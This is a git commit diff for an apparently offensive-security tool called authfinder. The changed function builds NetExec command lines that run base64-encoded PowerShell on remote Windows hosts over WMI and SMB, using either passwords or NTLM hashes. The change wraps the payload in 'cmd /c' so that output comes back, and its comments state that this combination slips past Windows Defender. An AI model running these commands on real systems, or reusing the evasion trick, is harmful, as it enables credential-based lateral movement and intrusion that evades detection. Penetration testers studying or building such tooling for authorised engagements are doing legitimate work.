589373f541c3fee31557a6706e65f2eb39684d5d
KhaelK138 <khaelkugler@gmail.com>
2026-01-23 00:46:15 -0600

    1.1.4, seems a basic powershell -enc doesn't get output, so we use the hacky cmd /c + powershell -enc

--- authfinder/authfinder.py
+++ authfinder/authfinder.py
@@ -229,11 +229,11 @@ def build_cmd(tool, user, target, credential, command):
                 f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
 
     if tool == "wmi":
-        # we don't actually need to pass the --no-output here, as defender won't catch it regardless it seems
-        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution
-        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}'"
+        # we don't actually need to pass the --no-output here, as defender won't catch it with this specific `cmd /c "powershell -enc` combo
+        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution for wmi specifically
+        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'"
                 if use_hash else
-                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}'")
+                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'")
 
     if tool == "ssh":
         if LINUX_MODE:
